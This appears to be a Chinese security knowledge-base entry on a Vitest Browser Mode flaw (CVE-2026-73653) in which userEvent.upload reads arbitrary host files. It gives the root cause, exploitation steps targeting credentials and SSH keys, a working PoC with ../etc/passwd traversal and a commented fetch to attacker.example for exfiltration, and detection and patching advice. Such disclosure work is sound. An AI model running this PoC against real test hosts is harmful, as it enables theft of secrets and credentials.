---
id: web-generic-auth-vitest-browser-upload-arbitrary-file-read
title: Vitest Browser Mode userEvent.upload 绕过 server.fs 读取宿主任意文件（CVE-2026-73653）
type: scenario
domain: web
path: web/generic/auth
technique: browser-rpc-provider-command-missing-file-access-gate
tags:
- vitest
- browser-mode
- playwright
- webdriverio
- nodejs
- permission-bypass
- arbitrary-file-read
- path-traversal
- cve-2026-73653
- testing-toolchain
cve:
- CVE-2026-73653
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: < 3.2.7；>= 4.0.0, < 4.1.10；>= 5.0.0-beta.1, < 5.0.0-beta.6（修复版本 3.2.7 / 4.1.10 / 5.0.0-beta.6）
verification:
  verified_by: verifier-V26
  verified_at: '2026-11-05T02:54:45+08:00'
  notes: 已对照原文与11张图核对：upload 读取链（triggerCommand→provider upload→resolve(root,file)→setInputFiles）与脆弱版本码一致；容器内 vitest 4.1.9 复现 LEAKED_SECRET:TOP_SECRET_DO_NOT_READ 与 browser-upload-leak.png，4.1.10 抛 Access denied；版本区间、CVE-2026-73653、GHSA-p63j-vcc4-9vmv 与原文一致。未复跑 PoC；WebdriverIO 读取面仅依据公告与调用链，未实测；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-vitest-browser-upload-arbitrary-file-read/
draft: false
kb_aliases:
- CVE-2026-73653
- GHSA-p63j-vcc4-9vmv
- Vitest Browser Mode 权限绕过
- userEvent.upload 任意文件读取
- __vitest_upload
- server.fs 绕过
- setInputFiles 读本地文件
- Browser API 文件读取
---

## 一句话结论

Vitest Browser Mode 的 `userEvent.upload()` 把浏览器侧传入的字符串路径在 Node/provider 侧 `resolve(root, file)` 后直接交给 Playwright/WDIO 的 `setInputFiles()`，既不检查 Vite `server.fs` 边界也不做路径收口。只要攻击者能触达 Browser Mode API（例如 `browser.api.host` 绑定非本机地址）或能控制被测代码，就能在 Vitest 进程权限下读取任意本地文件，并通过页面 `<input type="file">` 把内容读回浏览器上下文。

## 原理

- **架构边界**：Browser Mode 的测试代码跑在浏览器里，但 `userEvent.upload()` 等 API 会被序列化为命令，经 `triggerCommand` 跨 RPC 进入 Node 侧，再由 provider 调用 Playwright/WDIO 的本地能力。安全边界本应出现在两处：路径必须先过 `server.fs`，写入/删除必须先过 `api.allowWrite`。
- **读取链**：浏览器侧 `createUserEvent.upload` → `Locator.upload` → `triggerCommand('__vitest_upload')` → `rpc.ts` 的 `triggerCommand` → provider 的 `upload` → `resolve(root, file)` → `locator.setInputFiles(files)`。
- **为什么成立**：`path.resolve(root, file)` 只做路径解析，不会把结果限制在 `root` 内；绝对路径原样保留，`../` 也可穿出项目目录。provider 在 `resolve` 之后没有任何 `isFileLoadingAllowed` / `server.fs.deny` 检查，也没有把路径与项目根做包含关系断言。
- **读取不需要写权限**：这条链不涉及 `allowWrite`，因此即使 `api.allowWrite: false`，只要文件对 Node 进程可读，读取仍然成立。
- **回传路径**：`setInputFiles()` 把宿主文件装进页面里的 `<input type="file">`；测试代码再调用 `input.files[0].text()`（或 `arrayBuffer()`、`FileReader`）把内容读回 JS 上下文，随后可用 `fetch`、WebSocket、`console.log`、页面渲染或截图等方式外带。
- **不是纯内存上传**：浏览器侧传入 `File`/`Blob` 对象时走 base64 分片，不触达宿主文件；只有字符串路径分支会进入 Node 侧文件系统，因此 PoC 必须传路径字符串。

## 触发条件

- 目标使用 Vitest `< 3.2.7`、`>= 4.0.0, < 4.1.10` 或 `>= 5.0.0-beta.1, < 5.0.0-beta.6` 的 Browser Mode。
- 攻击者能触达 Browser Mode API：`browser.api.host` 绑定 `0.0.0.0`/非本机地址，或测试代码本身不可信（例如从被污染的依赖、外部 PR、共享 CI 执行）。
- 目标文件对 Vitest Node 进程可读；漏洞只绕过 Vitest/Vite 的逻辑边界，不绕过操作系统文件权限。
- 官方威胁模型：默认只监听 `localhost` 且测试代码可信时，不存在天然的远程攻击者，风险主要是隔离模型失效；对外暴露 API 或把 `allowWrite: false` 当作不可信代码隔离边界时风险显著抬高。

## 利用步骤

1. 确认 Browser Mode 版本落在受影响区间，并确认 API 暴露面（`browser.api.host`、端口、是否有反向代理）。
2. 在浏览器侧测试上下文准备一个 `<input type="file">`。
3. 调用 `userEvent.upload(input, '<目标路径>')`：可传项目内相对路径、`../../etc/passwd` 一类穿越路径，或绝对路径。
4. provider 在 Node 侧解析路径并调用 `setInputFiles()`，宿主文件被装入 input。
5. 用 `await input.files[0].text()` 读取内容，再通过 `fetch`/WebSocket 发出，或渲染到页面后截图。
6. 逐文件重复；高价值目标包括 `.env`、CI secret、云凭据、SSH 私钥、测试机上的 token 文件。

## PoC

```javascript
// vitest.config.mjs：故意设置应拒绝的基线
export default defineConfig({
  server: { fs: { deny: ['secret.txt'] } },
  test: {
    browser: {
      enabled: true,
      provider: playwright(),
      headless: true,
      api: { host: '0.0.0.0', port: 63315, allowExec: false, allowWrite: false },
      instances: [{ browser: 'chromium' }],
    },
  },
})
```

```javascript
// vulnerable.test.js
test('read a denied file through upload()', async () => {
  document.body.innerHTML = '<input id="f" type="file"><pre id="o"></pre>'
  const input = document.querySelector('#f')

  // 字符串路径才会进入 Node 侧文件系统；File/Blob 不会
  await userEvent.upload(input, 'secret.txt')
  // 也可用绝对路径或 ../ 穿越：await userEvent.upload(input, '../../../etc/passwd')

  const leaked = await input.files[0].text()
  document.querySelector('#o').textContent = `LEAKED:${leaked}`
  console.log(`LEAKED:${leaked}`)          // 脆弱版输出 LEAKED:TOP_SECRET_DO_NOT_READ
  // 外带：await fetch('https://attacker.example/?d=' + encodeURIComponent(leaked))
})
```

```text
预期：
脆弱版（如 vitest@4.1.9，Playwright provider）-> 测试通过，stdout 出现 LEAKED:TOP_SECRET_DO_NOT_READ
修复版（4.1.10）-> userEvent.upload 抛出 Access denied to "<root>/secret.txt"，内容不可读
```

## 变体与关联

- 变体（provider 差异）：官方公告把 `upload` 列为 Playwright 与 WebdriverIO 两种 provider 都受影响的读取面；本文本地复现基于 Playwright provider。
- 变体（路径形态）：相对路径可借 `../` 穿出项目根，绝对路径不被 `resolve` 收口；目标路径只要 Node 进程可读即可。
- 变体（外带方式）：读回内容后可经页面渲染 + 自动截图、`console.log` 被 reporter 收集、`fetch`/WebSocket 外发等方式带出；不必依赖同一次请求返回。
- 关联：[[web-generic-auth-vitest-browser-write-delete-artifact-exfil]]（同 CVE 的写/删/外带链，共享 `triggerCommand` → provider 分发模型）。
- 边界：默认 `localhost` + 可信测试代码时远程利用条件不成立；无法绕过 OS 文件权限；读取的是 Node 进程可见文件，不是任意物理磁盘。

## 检测与防御

- 修复：升级到 `3.2.7`、`4.1.10`、`5.0.0-beta.6` 或更高；补丁在 provider 的 `upload` 路径 resolve 后新增 `assertBrowserFileAccess(project, filepath)`，复用 Vite `isFileLoadingAllowed` 语义。
- 暴露面收缩：不要把 `browser.api.host` 绑定到 `0.0.0.0`；如必须远程访问，限制来源 IP、加认证/反代，并在 CI 中把 Browser Mode 视为对外服务而非本地调试工具。
- 隔离假设：不要仅依赖 `allowWrite: false` 隔离不可信测试代码；该配置不阻止读取链。
- 代码审计：搜索 `__vitest_upload`、`setInputFiles`、`resolve(root`、`triggerCommand`，检查所有浏览器侧可控路径在落地文件系统前是否经过同一个 mandatory 检查函数。
- 检测：Browser Mode 进程出现异常文件读取（`/etc/passwd`、`.env`、`~/.ssh/*`）、页面向外部域发 `fetch`/WebSocket、测试日志出现文件内容；CI 中不可信 PR 触发 Browser Mode 且伴随出网请求。
- 加固：在容器/CI 中以最小权限运行测试进程，挂载只读且不含生产凭据的文件系统，隔离 Browser Mode 的出网。
